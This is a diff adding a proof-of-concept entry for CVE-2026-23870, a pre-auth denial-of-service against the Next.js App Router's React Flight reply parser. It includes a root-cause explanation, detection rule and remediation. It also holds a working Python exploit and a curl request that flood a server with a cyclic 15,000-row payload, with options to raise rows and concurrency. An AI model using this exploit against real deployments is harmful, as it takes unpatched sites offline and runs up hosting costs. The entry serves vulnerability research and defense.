@@ -1,0 +1,208 @@
+
+<!-- 
+  File: 2026-05-17_nextjs-rsc-dos-flight-deserialization.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2026-05-08 |
+| **Author / Researcher** | dwisiswant0 |
+| **CVE / Advisory** | CVE-2026-23870 |
+| **Category** | web |
+| **Severity** | High |
+| **CVSS Score** | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H) |
+| **Status** | Weaponized |
+| **Tags** | DoS, RSC, React-Flight, deserialization, cyclic-payload, Next.js, App-Router, unauthenticated, pre-auth |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Next.js App Router (React server-action / RSC reply parser) |
+| **Versions Affected** | Next.js 13.x - 16.2.4 (bundled React experimental builds) |
+| **Language / Platform** | JavaScript / Node.js |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2026-23870 is a pre-authentication Denial of Service against any Next.js deployment using the App Router. An attacker sends crafted HTTP POST requests to any App Router server function endpoint with a deeply-cyclic or wide fan-out React Flight protocol payload. Pre-patch React's reply parser (`decodeReply` / `decodeAction`) walks model graph references without depth or cycle limits, causing unbounded CPU consumption or stack overflow. The attack requires no authentication and a single low-bandwidth request can stall a server process for 30+ seconds; concurrent requests can drive it to OOM or process restart.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+The bug is upstream in React's RSC reply parser. Next.js consumes it through `packages/next/src/server/app-render/action-handler.ts` (`decodeAction`) and `use-flight-response.tsx` (`decodeReply`), both imported from the bundled `react-server-dom-webpack/server.edge`. Pre-patch React walked `$<n>` row references, `$Sym$Iterator`, and `$F.bind` markers during model construction without enforcing a maximum depth, maximum reference chain length, or cycle detection. Self-referential cycles (row N referencing row 0) triggered recursive stack exhaustion; wide fan-out graphs burned CPU for hundreds of seconds. The React bump in Next.js 16.2.5 added bounded recursion and fail-fast cycle detection.
+
+### Attack Vector
+
+Unauthenticated HTTP POST to any App Router page URL (e.g. `/`, `/login`, `/api/action`) with headers `Next-Action: <any 40-hex string>`, `Content-Type: text/x-component`, and a form-encoded body containing a cyclic RSC reply payload (N rows where each row references the next, with the last row pointing back to row 0).
+
+### Impact
+
+Denial of Service of the entire Next.js process. In serverless deployments each malicious request consumes up to 3 GB / 30 s CPU budget, causing financial DoS alongside availability DoS. No authentication required. Rated CVSS 7.5 High with active exploitation observed in the wild.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux / macOS / Windows
+Target:      Next.js 13.x - 16.2.4 with App Router enabled
+Attacker:    Any host able to send crafted HTTP POST requests
+Tools:       python3, bash, curl, openssl
+```
+
+### Setup Steps
+
+```bash
+git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
+cd next-16.2.4-pocs/poc/CVE-2026-23870_GHSA-8h8q-6873-q5fj
+
+python3 exploit.py
+
+python3 exploit.py http://target/ --rows 20000 --concurrency 5
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Baseline GET** - confirm the server is reachable and responding normally.
+   ```bash
+   curl -i http://target/
+   ```
+
+2. **Build cyclic RSC reply payload** - a ring of N rows where row i references row (i+1)%N.
+   ```python
+   import urllib.parse
+   rows = 15000
+   parts = []
+   for i in range(rows):
+       nxt = (i + 1) % rows
+       val = f'["$F","{i:x}",{{"r":"${nxt:x}"}}]'
+       parts.append(f"{i}={urllib.parse.quote(val, safe='')}")
+   body = "&".join(parts).encode()
+   ```
+
+3. **POST the malicious payload** with the Next-Action header.
+   ```bash
+   curl -sS -X POST http://target/ \
+     -H 'Content-Type: application/x-www-form-urlencoded' \
+     -H 'Next-Action: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' \
+     -H 'Accept: text/x-component' \
+     --data-binary @cyclic_payload.bin \
+     -w '%{http_code} t=%{time_total}s\n' --max-time 60
+   ```
+
+4. **Observe** server response time > 2s or 5xx error indicating DoS condition.
+
+### Exploit Code
+
+> See `exploit.py` and `exploit.sh` in this folder.
+
+```python
+import urllib.request, urllib.parse
+
+TARGET = "http://target/"
+ROWS = 15000
+
+parts = []
+for i in range(ROWS):
+    nxt = (i + 1) % ROWS
+    val = f'["$F","{i:x}",{{"r":"${nxt:x}"}}]'
+    parts.append(f"{i}={urllib.parse.quote(val, safe='')}")
+body = "&".join(parts).encode()
+
+req = urllib.request.Request(
+    TARGET, data=body, method="POST",
+    headers={
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Next-Action": "a" * 40,
+        "Accept": "text/x-component",
+    },
+)
+import time
+t0 = time.perf_counter()
+try:
+    urllib.request.urlopen(req, timeout=60)
+except Exception:
+    pass
+print(f"Server wall time: {time.perf_counter()-t0:.2f}s")
+```
+
+### Expected Output
+
+```
+[+] VULNERABLE -- RSC reply parsed for 30.14s.
+    Concurrent attackers can DoS the deployment.
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` - add captures showing elevated server CPU / response time
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+POST / HTTP/1.1  Next-Action: [a-f0-9]{40}  Content-Type: application/x-www-form-urlencoded
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> $HTTP_SERVERS any (
+  msg:"Possible CVE-2026-23870 RSC DoS attempt";
+  content:"Next-Action|3a|"; http_header;
+  content:"application/x-www-form-urlencoded"; http_header;
+  dsize:>10000;
+  sid:900023870; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Next.js to 15.5.16 or 16.2.5+ (carries the React cycle-detection fix) |
+| **Workaround** | Enforce request body size limits at the edge (<=256 KB for server action bodies) |
+| **Config Hardening** | Monitor CPU / wall-time per-request and reject outliers; rate-limit POST requests to App Router endpoints |
+
+---
+
+## References
+
+- [CVE-2026-23870 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-23870)
+- [Next.js Advisory - GHSA-8h8q-6873-q5fj](https://github.com/vercel/next.js/security/advisories/GHSA-8h8q-6873-q5fj)
+- [React reply parser source](https://github.com/facebook/react/blob/main/packages/react-server-dom-webpack/src/ReactFlightReplyServer.js)
+- [Next.js action-handler source](https://github.com/vercel/next.js/blob/main/packages/next/src/server/app-render/action-handler.ts)
+- [Source Repository - dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.
+
+Active exploitation has been observed in the wild. The attack surface covers every Next.js App Router deployment regardless of whether server actions are explicitly defined, since Next.js routes any POST with a `Next-Action` header to the action handler before ID validation. Issue tracked as #49.
+
